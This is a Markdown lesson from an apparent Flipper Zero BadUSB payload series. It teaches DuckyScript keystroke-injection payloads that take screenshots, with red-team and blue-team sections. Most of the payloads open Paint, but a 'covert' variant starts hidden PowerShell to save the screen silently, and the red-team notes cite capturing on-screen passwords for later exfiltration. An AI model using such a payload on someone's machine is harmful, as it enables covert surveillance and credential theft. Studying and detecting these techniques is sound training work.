# FZ-B07: Screenshot Capture - Windows

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-B07 |
| **Name** | Screenshot Capture |
| **Difficulty** | Basic |
| **Target OS** | Windows 10/11 |
| **Execution Time** | ~5 seconds |
| **MITRE ATT&CK** | T1113 (Screen Capture) |

## What This Payload Does

Captures the screen to clipboard using PrintScreen, then opens Paint and pastes the image so it's visible.

---

## The Payload

```ducky
REM =============================================
REM BASIC: Take Screenshot
REM Target: Windows 10/11
REM Action: Captures screen to clipboard
REM Skill: Basic
REM =============================================

DELAY 1500
PRINTSCREEN
DELAY 500
GUI r
DELAY 500
STRING mspaint
ENTER
DELAY 1500
CTRL v
```

---

## Line-by-Line Breakdown

| Line | Command | Purpose |
|------|---------|---------|
| 1-6 | REM | Documentation header |
| 8 | DELAY 1500 | Initial delay |
| 9 | PRINTSCREEN | Capture screen to clipboard |
| 10 | DELAY 500 | Wait for capture |
| 11 | GUI r | Open Run dialog |
| 12 | DELAY 500 | Wait for dialog |
| 13 | STRING mspaint | Type Paint |
| 14 | ENTER | Launch Paint |
| 15 | DELAY 1500 | Wait for Paint to open |
| 16 | CTRL v | Paste screenshot |

---

## Screenshot Variations

### Windows Snipping Tool (Modern)
```ducky
DELAY 1500
GUI SHIFT s
```
Opens Snip & Sketch tool for selective capture.

### Save Screenshot Directly
```ducky
DELAY 1500
GUI PRINTSCREEN
```
Saves automatically to Pictures\Screenshots folder.

### Active Window Only
```ducky
DELAY 1500
ALT PRINTSCREEN
```
Captures only the active window.

---

## Cross-Platform Versions

### macOS - Full Screen
```ducky
DELAY 1500
GUI SHIFT 3
```
Saves to Desktop as PNG.

### macOS - Selection
```ducky
DELAY 1500
GUI SHIFT 4
```
Allows user to select area.

### Linux (GNOME)
```ducky
DELAY 1500
PRINTSCREEN
```
Opens screenshot dialog.

### Linux - Save Directly
```ducky
DELAY 2000
CTRL ALT t
DELAY 1000
STRINGLN gnome-screenshot -f ~/Desktop/screenshot.png
```

---

## Covert Screenshot (Advanced)

Save without opening Paint:

```ducky
REM Covert screenshot to file
DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden -c "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen | ForEach-Object { $bitmap = New-Object System.Drawing.Bitmap($_.Bounds.Width, $_.Bounds.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($_.Bounds.Location, [System.Drawing.Point]::Empty, $_.Bounds.Size); $bitmap.Save('$env:TEMP\screen.png') }"
ENTER
```

---

## Red Team Perspective

### Why Screenshots Matter
- Capture sensitive data displayed on screen
- See what user is working on
- Document target environment
- Capture passwords visible in dialogs
- Evidence collection

### Covert Screenshot Flow
1. Wait for user to be active
2. Capture screen silently
3. Save to temp folder
4. Exfiltrate later (or via network)

---

## Blue Team Perspective

### Detection Opportunities
- Paint launching unexpectedly
- PowerShell accessing screen capture APIs
- New image files in temp directories
- Clipboard access by unknown processes

### Monitoring
```powershell
# Monitor for suspicious image files
Get-ChildItem -Path $env:TEMP -Filter "*.png" -Recurse |
    Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-5) }
```

### Prevention
- DLP solutions that monitor for screen capture
- Endpoint protection that detects screenshot malware
- Application whitelisting

---

## Practice Exercises

### Exercise 1: Save Directly
Use Win+PrintScreen to save automatically:
```ducky
DELAY 1500
GUI PRINTSCREEN
```
Then check Pictures\Screenshots folder.

### Exercise 2: Multiple Screenshots
Capture 3 screenshots with delays:
```ducky
DELAY 1500
GUI PRINTSCREEN
DELAY 2000
GUI PRINTSCREEN
DELAY 2000
GUI PRINTSCREEN
```

### Exercise 3: Active Window
Capture just the active window:
```ducky
DELAY 1500
ALT PRINTSCREEN
DELAY 500
GUI r
DELAY 500
STRING mspaint
ENTER
DELAY 1500
CTRL v
```

---

## Payload File

Save as `FZ-B07_Screenshot.txt`:

```ducky
REM FZ-B07: Screenshot Capture
DELAY 1500
PRINTSCREEN
DELAY 500
GUI r
DELAY 500
STRING mspaint
ENTER
DELAY 1500
CTRL v
```

---

[← FZ-B06 Lock Workstation](FZ-B06_Lock_Workstation.md) | [Next: FZ-B08 Text-to-Speech →](FZ-B08_Text_to_Speech.md)
